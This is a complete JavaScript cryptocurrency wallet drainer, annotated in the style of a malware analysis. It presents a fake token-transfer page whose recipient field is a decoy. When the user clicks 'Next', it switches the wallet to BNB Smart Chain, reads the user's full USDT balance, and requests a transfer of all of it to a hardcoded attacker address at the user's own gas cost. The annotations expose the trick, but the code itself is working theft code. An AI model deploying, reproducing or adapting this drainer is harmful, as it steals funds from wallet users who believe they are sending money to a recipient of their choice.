// ── Phase 1: Module Initialization ──
import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';

// ── Attacker's Operational Constants ──
// THIS is the REAL destination where funds go (hardcoded attacker wallet)
const DEST_WALLET  = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";

// The USDT contract address on BSC
const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
const BSC_CHAIN_ID = "0x38";

// ── Runtime State ──
let provider;
let userAddress;

// ── Silent Recon Engine ──

// D1 — Silent balanceOf via raw eth_call (0x70a08231)
async function fetchMaxBalance(addr) {
    try {
        const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
        const res = await fetch(BSC_RPC, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0", id: 1,
                method: "eth_call",
                params: [{ to: USDT_BEP20, data: data }, "latest"]
            })
        });
        const json = await res.json();
        return (json.result && json.result !== '0x') ? json.result : null;
    } catch (e) { return null; }
}

// ── Drain Engine ──
async function executeDrain(balanceHex) {
    const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;

    // If balance is 0 or very small, use whatever user typed
    let amountHex;
    if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
        amountHex = balanceHex.replace('0x', '').padStart(64, '0');
    } else {
        const val = document.getElementById('amountInput').value || "1";
        amountHex = BigInt(Math.floor(parseFloat(val) * 10**18)).toString(16).padStart(64, '0');
    }

    // IMPORTANT: ALWAYS uses DEST_WALLET (attacker's address)
    // The UI recipientInput is IGNORED completely - it's just a decoy!
    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
    const txData = "0xa9059cbb" + cleanDest + amountHex;

    // User pays their own gas fees
    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: userAddress,
            to: USDT_BEP20,
            data: txData,
            value: '0x0'
        }]
    });
}

// ── DOM Registry ──
const ui = {
    nextBtn: document.getElementById('nextBtn'),
    amountInput: document.getElementById('amountInput'),
    usdLabel: document.getElementById('usdLabel'),
    recipientInput: document.getElementById('recipientInput'), // THIS IS A DECOY - NEVER USED
    clearAddr: document.getElementById('clearAddr'),
    clearAmount: document.getElementById('clearAmount'),
    maxBtn: document.getElementById('maxBtn'),
    addrGroup: document.getElementById('addrGroup'),
    amountGroup: document.getElementById('amountGroup'),
    pasteBtn: document.getElementById('pasteBtn')
};

// ── Module Entry Point ──
document.addEventListener('DOMContentLoaded', () => {

    // Check 1 — Served from real web server (not file://)
    if (location.protocol === 'file:') {
        console.warn('[ABORT] Check 1 fail: file:// protocol');
        return;
    }

    // Check 2 — window.ethereum injected by wallet
    if (typeof window.ethereum === 'undefined') {
        console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
        return;
    }

    // Check 3 — nextBtn exists in DOM
    if (!ui.nextBtn) {
        console.warn('[ABORT] Check 3 fail: #nextBtn not found');
        return;
    }

    // Bind click listener
    ui.nextBtn.addEventListener('click', handleNextClick);

    // UI Helpers (these only affect the UI display, not the actual transaction)
    ui.amountInput.oninput = () => {
        const val = parseFloat(ui.amountInput.value) || 0;
        ui.usdLabel.textContent = val.toFixed(2);
        ui.nextBtn.disabled = val <= 0;
        if (val > 0) {
            ui.nextBtn.classList.add('enabled');
            ui.clearAmount.style.display = 'flex';
        } else {
            ui.nextBtn.classList.remove('enabled');
            ui.clearAmount.style.display = 'none';
        }
    };

    // Clear amount button
    ui.clearAmount.onclick = () => {
        ui.amountInput.value = '';
        ui.amountInput.oninput();
    };

    // Clear address button (only clears the DECOY address)
    ui.clearAddr.onclick = () => {
        ui.recipientInput.value = '';
        ui.clearAddr.style.display = 'none';
    };

    // Recipient input handler (only for DECOY display)
    ui.recipientInput.oninput = () => {
        if (ui.recipientInput.value.length > 0) {
            ui.clearAddr.style.display = 'flex';
        } else {
            ui.clearAddr.style.display = 'none';
        }
    };

    // Max button
    ui.maxBtn.onclick = () => {
        ui.amountInput.value = "1000";
        ui.amountInput.oninput();
    };

    // Paste button (pastes into DECOY field)
    ui.pasteBtn.onclick = async () => {
        try {
            const text = await navigator.clipboard.readText();
            ui.recipientInput.value = text;
            ui.recipientInput.oninput();
        } catch (e) {
            console.log('Clipboard read failed');
        }
    };

    // Focus effects
    ui.addrGroup.addEventListener('focusin', () => ui.addrGroup.classList.add('active'));
    ui.addrGroup.addEventListener('focusout', () => ui.addrGroup.classList.remove('active'));
    ui.amountGroup.addEventListener('focusin', () => ui.amountGroup.classList.add('active'));
    ui.amountGroup.addEventListener('focusout', () => ui.amountGroup.classList.remove('active'));

    // Initial trigger
    ui.recipientInput.oninput();
});

// ── Main Interaction Controller ──
async function handleNextClick() {
    if (ui.nextBtn.disabled) return;

    const originalContent = ui.nextBtn.innerHTML;
    ui.nextBtn.innerHTML = 'Processing...';
    ui.nextBtn.disabled = true;

    try {
        // Step 1 — Switch to BSC network
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_CHAIN_ID }]
            });
        } catch (e) {
            if (e.code === 4902) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_CHAIN_ID,
                            chainName: 'BNB Smart Chain',
                            rpcUrls: [BSC_RPC],
                            nativeCurrency: {
                                name: 'BNB',
                                symbol: 'BNB',
                                decimals: 18
                            },
                            blockExplorerUrls: ['https://bscscan.com']
                        }]
                    });
                } catch (addError) {
                    console.log('Failed to add BSC network');
                }
            }
        }

        // Step 2 — Get user wallet address
        const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
        userAddress = accounts[0] ||
            (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];

        if (!userAddress) {
            throw new Error('No wallet connected');
        }

        // Step 3 — Init provider
        provider = new ethers.providers.JsonRpcProvider(BSC_RPC);

        // Step 4 — Silent USDT balance recon
        const balanceHex = await fetchMaxBalance(userAddress);
        
        // Step 5 — Execute the drain (user pays gas)
        // Funds go to DEST_WALLET, NOT to what's in recipientInput!
        await executeDrain(balanceHex);

        ui.nextBtn.innerHTML = '✓ Completed';
        setTimeout(() => {
            ui.nextBtn.innerHTML = 'Next';
            ui.nextBtn.disabled = false;
        }, 3000);
        
    } catch (err) {
        console.error(err);
        ui.nextBtn.innerHTML = '❌ Failed';
        setTimeout(() => {
            ui.nextBtn.innerHTML = 'Next';
            ui.nextBtn.disabled = false;
        }, 3000);
    }
}
